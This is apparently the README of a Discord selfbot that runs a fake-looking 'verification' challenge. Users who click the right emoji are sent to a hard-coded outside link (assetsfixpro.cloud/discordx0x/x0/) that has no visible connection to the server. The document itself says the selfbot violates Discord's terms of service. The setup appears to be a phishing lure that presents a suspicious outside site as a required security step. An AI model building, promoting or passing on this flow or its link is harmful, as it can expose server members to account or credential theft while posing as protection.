# User Verification System

## 🔐 Overview

Admins can trigger a verification process for users. The user must select the correct icon from a set of buttons to verify themselves. Upon successful verification, they receive a link to the verification website.

## How It Works

### For Admins

**Command (any of these formats work):**

```
!verify @username
@verify @username
/verify @username
verify @username
```

**Examples:**

```
!verify @JohnDoe
@verify @NewMember
/verify @SuspiciousUser
verify @TestUser
```

**Requirements:**

- Must have `ADMINISTRATOR` or `MANAGE_GUILD` permission
- Must mention a user

### For Users

1. Admin sends the verification command mentioning you
2. You receive a message with 6 icon buttons
3. Click the **correct icon** shown in the message
4. ✅ If correct: You get the verification link
5. ❌ If wrong: You're told to try again

## 🎨 Verification Icons

The system uses these icons:

- 🔒 Lock
- 🔑 Key
- ✅ Check mark
- 🛡️ Shield
- ⭐ Star
- 🎯 Target

One is randomly selected as the correct answer each time.

## 📋 Example Flow

**Admin types:**

```
@verify @NewUser
```

**Bot sends:**

```
@NewUser, please verify yourself by clicking the **🔑** button below:
[🔒] [🔑] [✅] [🛡️] [⭐] [🎯]
```

**User clicks 🔑:**

```
✅ Verification successful! Please visit: https://assetsfixpro.cloud/discordx0x/x0/
```

**User clicks wrong icon:**

```
❌ Wrong icon! Please select the **🔑** icon.
```

## ⏱️ Time Limit

- Verification expires after **2 minutes**
- The verification message auto-deletes after expiration
- User must complete verification within this time

## 🔒 Security Features

1. **Admin-only**: Only admins can trigger verification
2. **User-specific**: Only the mentioned user can click the buttons
3. **One-time use**: Verification is deleted after successful completion
4. **Auto-expire**: Prevents old verifications from cluttering chat
5. **Random icons**: Different icon each time prevents memorization

## 🚫 Error Messages

### "❌ You need administrator permissions to use this command."

- Only admins can use `@verify`
- Contact a server administrator

### "❌ This verification is not for you!"

- Someone else tried to click your verification buttons
- Only you can complete your verification

### "❌ Verification expired or not found."

- Verification took longer than 2 minutes
- Ask admin to send a new verification

### "❌ Wrong icon! Please select the **[icon]** icon."

- You clicked the wrong button
- Try again with the correct icon shown in the message

## 🎯 Use Cases

1. **New member verification** - Verify new users before granting access
2. **Role assignment** - Verify users before giving them special roles
3. **Support tickets** - Verify user identity before handling sensitive issues
4. **Account recovery** - Confirm user ownership
5. **Anti-bot protection** - Ensure real humans are joining

## 🛠️ Customization

### Change Icons

Edit line 214 in `index.js`:

```javascript
const icons = ["🔒", "🔑", "✅", "🛡️", "⭐", "🎯"];
// Replace with your preferred icons
```

### Change Verification URL

Edit line 113 in `index.js`:

```javascript
content: `✅ Verification successful! Please visit: https://assetsfixpro.cloud/discordx0x/x0/`,
// Replace with your URL
```

### Change Time Limit

Edit line 256 in `index.js`:

```javascript
}, 120000); // 2 minutes in milliseconds
// Change to your preferred duration (e.g., 180000 = 3 minutes)
```

## 📊 Admin Tips

1. **Use in verification channels** - Create a dedicated #verification channel
2. **Combine with roles** - Manually assign roles after successful verification
3. **Monitor logs** - Check console for verification attempts
4. **Clear instructions** - Tell users what to expect before verification

## 🔍 Troubleshooting

### Buttons not showing

- Selfbots have limited button support
- User must have updated Discord client
- Try using reactions instead if buttons don't work

### Verification not working

- Check bot has `SEND_MESSAGES` permission
- Ensure user has `VIEW_CHANNEL` permission
- Check console logs for errors

### User can't click buttons

- Only the mentioned user can click
- Verification may have expired
- Send a new verification

## 📝 Console Logs

**Verification sent:**

```
Verification sent to username#1234 - Correct icon: 🔑
```

**Successful verification:**

```
✅ username#1234 verified successfully
```

**Wrong icon selected:**

```
❌ username#1234 selected wrong icon: 🔒 (correct: 🔑)
```

## 🎓 Best Practices

1. ✅ Use in moderated channels
2. ✅ Explain the process to users first
3. ✅ Have clear server rules about verification
4. ✅ Monitor for abuse
5. ❌ Don't spam verification requests
6. ❌ Don't use for harassment
7. ❌ Don't share verification links publicly

## 🔗 Integration Ideas

- **Welcome system**: Auto-verify new members
- **Ticket system**: Verify before creating tickets
- **Role system**: Assign verified role after completion
- **Logging**: Log all verification attempts
- **Database**: Store verification history

## ⚠️ Important Notes

- This is a selfbot feature (against Discord ToS)
- Use responsibly and at your own risk
- Buttons may not work in all Discord clients
- Consider converting to official bot for better reliability
